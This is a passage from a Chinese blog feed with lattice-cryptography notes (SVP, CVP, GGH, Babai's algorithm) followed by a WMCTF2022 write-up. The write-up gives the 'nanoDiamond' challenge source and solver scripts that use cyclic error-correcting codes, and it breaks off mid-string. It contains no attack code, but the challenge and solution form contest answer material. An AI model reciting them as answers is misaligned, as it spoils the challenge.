id="SVP｜shortest-vector-problem"><a href="#SVP｜shortest-vector-problem" class="headerlink" title="SVP｜shortest vector problem"></a>SVP｜shortest vector problem</h3><p><strong>最短向量问题</strong>：给定一个基为$B$的Lattice $L(B)$，找到一个这个基构成的格点，使得这个点距离0坐标点的距离最近.</p><h3 id="SIVP（shortest-independent-vector-problem）"><a href="#SIVP（shortest-independent-vector-problem）" class="headerlink" title="SIVP（shortest independent vector problem）"></a>SIVP（shortest independent vector problem）</h3><p><strong>最短独立向量问题</strong>：给定一个Lattice $L(B)$，找到n个线性独立的向量$x_1,…,x_n$并且这些向量的长度都要小于等于最长的最短向量$\lambda_n$.</p><h3 id="CVP（closed-vector-problem）"><a href="#CVP（closed-vector-problem）" class="headerlink" title="CVP（closed vector problem）"></a>CVP（closed vector problem）</h3><p><strong>最近向量问题：</strong>给定连续空间中任意的一个点$t$，找到距离点$t$最近的格点.</p><hr><p>为了进一步体会、理解，这里介绍基于格的GGH加密体系</p><h2 id="GGH"><a href="#GGH" class="headerlink" title="GGH"></a><a href="https://kel.bz/post/lattices/">GGH</a></h2><blockquote><p>已死亡。</p></blockquote><p>GGH的陷门在于求解CVP的困难性。</p><p>给定点$w$，若再给出正交性好的短基，能高效地用利用<strong>Babai’s Closest Vector algorithm</strong>求解CVP</p><h3 id="Babai’s-Closest-Vector-algorithm"><a href="#Babai’s-Closest-Vector-algorithm" class="headerlink" title="Babai’s Closest Vector algorithm"></a>Babai’s Closest Vector algorithm</h3><h4 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h4><p>给定点w，基向量组为$[v_1, .., v_n]$, 算法的思路是在实数范围内找到$T$满足$w = t_1v_1+…+t_n*v_n$</p><p>然后对$T$中各元素四舍五入，来找到格上最靠近w点的向量$T’*basis$.</p><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>要求给的格基<strong>短</strong>且<strong>正交性好（接近正交基）</strong>，都满足的话能非常高效准确地求解.</p><p>而对于正交性差的格基，求解出来的结果基本是错误的.</p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://gist.github.com/kelbyludwig/201d08e3e8e9a4f3764f366398f12a47</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">babai</span>(<span class="params">w, basis</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    babai will approximate the closest lattice point formed by the supplied basis</span></span><br><span class="line"><span class="string">    to the supplied vector w. babai only works well when given a &quot;good&quot; basis.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    W = Matrix(RR, w)</span><br><span class="line">    BR = basis.change_ring(RR) </span><br><span class="line">    T = BR.solve_left(W)</span><br><span class="line">    C = vector(ZZ, [<span class="built_in">round</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> T[<span class="number">0</span>]])</span><br><span class="line">    <span class="keyword">return</span> C*basis</span><br></pre></td></tr></table></figure><hr><p>结合LLL后, Babai的最近平面算法</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def babai(<span class="selector-tag">A</span>, w):</span><br><span class="line">    A = A.<span class="built_in">LLL</span>()</span><br><span class="line">    G = A.<span class="built_in">gram_schmidt</span>()[<span class="number">0</span>]</span><br><span class="line">    t = w</span><br><span class="line">    for i in <span class="built_in">reversed</span>(<span class="built_in">range</span>(A.<span class="built_in">nrows</span>())):</span><br><span class="line">        c = ((t * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">        t -= A[i] * c</span><br><span class="line">    return w - t</span><br></pre></td></tr></table></figure><h3 id="正交性"><a href="#正交性" class="headerlink" title="正交性"></a>正交性</h3><p>我称格基接近最短正交基的程度为正交性，参考<a href="https://gist.github.com/kelbyludwig">kelbyludwig</a>的博客，可利用<strong>hadamard ratio</strong>来衡量正交性，详细如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hadamard_ratio</span>(<span class="params">basis</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    hadamard_ratio returns the hadamard ratio of the supplied basis. the hadamard</span></span><br><span class="line"><span class="string">    ratio is a number between 0 and 1 that quantifies the orthogonality of the</span></span><br><span class="line"><span class="string">    baiss. The higher the hadamard ratio, the more orthogonal (read: better) the</span></span><br><span class="line"><span class="string">    basis.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(basis.rows()) != <span class="built_in">len</span>(basis.columns()):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;no non-square matrices allowed&quot;</span>)</span><br><span class="line">    BR = basis.change_ring(RR)</span><br><span class="line">    d = BR.determinant()</span><br><span class="line">    ls = [v.norm() <span class="keyword">for</span> v <span class="keyword">in</span> BR]</span><br><span class="line">    l = reduce(<span class="keyword">lambda</span> x,y: <span class="number">1.0</span>*x*y, ls)</span><br><span class="line">    <span class="keyword">return</span> (d/l)**(<span class="number">1.0</span>/<span class="number">3.0</span>)</span><br></pre></td></tr></table></figure><h3 id="GGH加解密"><a href="#GGH加解密" class="headerlink" title="GGH加解密"></a>GGH加解密</h3><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>具体的，GGH加密过程如下：</p><ol><li>随机生成一个hadamard ratio高的格基s，作为私钥</li><li>将s乘随机生成的幺模矩阵，得到hadamard ratio低的格基B，作为公钥</li><li>将消息转换为向量$m$，再置入格中的点p($p=m*B$)</li><li>生成每个元素随机为<strong>±sigma（sigma默认为3，得较小）</strong>的扰动向量e</li><li>计算$c = p + e$，c作为密文</li></ol><p>本质上，GGH加密就是把格中的信息向量给微移了，使得这个点不在格上了</p><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>对应的，GGH解密过程如下：</p><ol><li>有私钥s、密文c，利用Babai算法求出格上距离c最近的向量p</li><li>$m = p/B$，解出明文m</li></ol><p>精妙绝伦，因为无论格基B还是s，所对应的格都是相同的（所以对s的cvp结果等效于对B的cvp结果）</p><p>但利用s的正交性好可求解cvp的特点，把s做私钥，w做公钥实现陷门的构造。</p><h3 id="Nyguen’s-Attack"><a href="#Nyguen’s-Attack" class="headerlink" title="Nyguen’s Attack"></a>Nyguen’s Attack</h3><p>GGH公开没几年，发明者们为了证明其安全性在网上组织了挑战，并给了5组加密后的密文与公钥</p><p>Nyguen实现了攻击，把五组密文都给破解了，GGH发明者之一直呼：”今其亡矣！”</p><p>之前博客有说，LLL把背包打穿了个大口，而Nyguen’s Attack则直接<strong>杀死了GGH</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://space.bilibili.com/5277360/video">https://space.bilibili.com/5277360/video</a></p><p>[2] <a href="http://www.zimablue.life/2022/05/04/Lattice-Lesson1/">http://www.zimablue.life/2022/05/04/Lattice-Lesson1/</a></p><p>[3] <a href="https://www.zhihu.com/column/c_1312093478458458112">https://www.zhihu.com/column/c_1312093478458458112</a></p><p>[4] <a href="https://zhuanlan.zhihu.com/p/161622928">https://zhuanlan.zhihu.com/p/161622928</a></p><p>[5] <a href="https://kel.bz/post/lattices/">https://kel.bz/post/lattices/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022wmctf</title>
      <link href="/2022/08/24/2022wmctf/"/>
      <url>/2022/08/24/2022wmctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WMCTF2022"><a href="#WMCTF2022" class="headerlink" title="WMCTF2022"></a>WMCTF2022</h1><h2 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h2><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220822211055392.png" alt="image-20220822211055392"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="nanoDiamond"><a href="#nanoDiamond" class="headerlink" title="nanoDiamond"></a>nanoDiamond</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, shuffle, choice</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join([secrets.choice(string.digits + string.ascii_letters)</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;sha256(XXXX+<span class="subst">&#123;s[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;sha256(s.encode()).hexdigest()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;Give me XXXX: &#x27;</span>) != s[:<span class="number">4</span>]:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ROUND_NUM = <span class="number">50</span></span><br><span class="line">PREROUND_NUM = <span class="number">14</span></span><br><span class="line">CHEST_NUM = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;test&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">white_list = [<span class="string">&#x27;==&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;B0&#x27;</span>,<span class="string">&#x27;B1&#x27;</span>,<span class="string">&#x27;B2&#x27;</span>,<span class="string">&#x27;B3&#x27;</span>,<span class="string">&#x27;B4&#x27;</span>,<span class="string">&#x27;B5&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">ans, chests, expr</span>):</span></span><br><span class="line">    B0, B1, B2, B3, B4, B5 = chests</span><br><span class="line">    <span class="keyword">return</span> ans(<span class="built_in">eval</span>(expr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span>():</span></span><br><span class="line">    chests = [choice((<span class="literal">True</span>, <span class="literal">False</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(CHEST_NUM)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Six chests lie here, with mimics or treasure hidden inside.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;But don&#x27;t worry. Skeleton Merchant knows what to do.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Be careful, Skeleton Merchant can lie twice!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    truth = <span class="keyword">lambda</span> r: <span class="keyword">not</span> <span class="keyword">not</span> r</span><br><span class="line">    lie = <span class="keyword">lambda</span> r: <span class="keyword">not</span> r</span><br><span class="line">    lie_num = randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">    lie_status = [truth] * (PREROUND_NUM - lie_num) + [lie] * lie_num</span><br><span class="line">    shuffle(lie_status)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(PREROUND_NUM):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            question = <span class="built_in">input</span>(<span class="string">&#x27;Question: &#x27;</span>).strip()</span><br><span class="line">            <span class="keyword">for</span> word <span class="keyword">in</span> question.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(word)</span><br><span class="line">                <span class="keyword">assert</span> word <span class="keyword">in</span> white_list, <span class="string">f&quot;(<span class="subst">&#123;word&#125;</span>) No treasure for dirty hacker!&quot;</span></span><br><span class="line">            result = calc(lie_status[i], chests, question)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Answer: <span class="subst">&#123;result&#125;</span>!&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Skeleton Merchant fails to understand your words.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Now open the chests:&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> chests == <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().strip().split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    proof_of_work()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Terraria is a land of adventure! A land of mystery!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Can you get all the treasure without losing your head?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUND_NUM):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">round</span>():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;A chest suddenly comes alive and BITE YOUR HEAD OFF.&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;You take all the treasure safe and sound. Head to the next vault!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;You&#x27;ve found all the treasure! <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>starctf2022同类型题，信息论中利用生成多项式与循环码纠正错误</p><p>找到<a href="https://github.com/sixstars/starctf2022/tree/main/crypto-Patches2">wp</a>，原题是（15，7），这里是（14，6），因此生成多项式不用改动，改参数即可</p><p><strong>part1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt;= PolynomialRing(GF(<span class="number">2</span>))</span><br><span class="line">g = x ^ <span class="number">8</span> + x ^ <span class="number">7</span> + x ^ <span class="number">6</span> + x ^ <span class="number">4</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2p</span>(<span class="params">a</span>):</span></span><br><span class="line">    a = <span class="built_in">bin</span>(a)[<span class="number">2</span>:]</span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> a[<span class="built_in">len</span>(a) - i - <span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            p += x ^ i</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">i</span>):</span></span><br><span class="line">    m = n2p(i)</span><br><span class="line">    c = (x ^ <span class="number">8</span>) * m + (((x ^ <span class="number">8</span>) * m) % g)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(<span class="built_in">int</span>(i <span class="keyword">in</span> c.exponents())) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">6</span>):</span><br><span class="line">    dic.append(enc(i))</span><br><span class="line"></span><br><span class="line">part = <span class="string">&quot;( B0 == &#123;&#125; and B1 == &#123;&#125; and B2 == &#123;&#125; and B3 == &#123;&#125; and B4 == &#123;&#125; and B5 == &#123;&#125;) &quot;</span></span><br><span class="line">questions = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    question = <span class="string">&quot;&quot;</span></span><br><span class="line">    nums = [j[:<span class="number">6</span>] <span class="keyword">for</span> j <span class="keyword">in</span> dic <span class="keyword">if</span> j[i] == <span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">len</span>(nums) == <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        n = nums[j]</span><br><span class="line">        question += part.<span class="built_in">format</span>(n[<span class="number">0</span>], n[<span class="number">1</span>], n[<span class="number">2</span>], n[<span class="number">3</span>], n[<span class="number">4</span>], n[<span class="number">5</span>]) + <span class="string">&quot;or &quot;</span></span><br><span class="line">    questions.append(question[:-<span class="number">4</span>])  <span class="comment"># ?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dif</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> a[i] != b[i]:</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(questions)</span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure><p><strong>part2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dif</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> a[i] != b[i]:</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">questions = [</span><br><span class="line">    <span class="string">&#x27;( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and 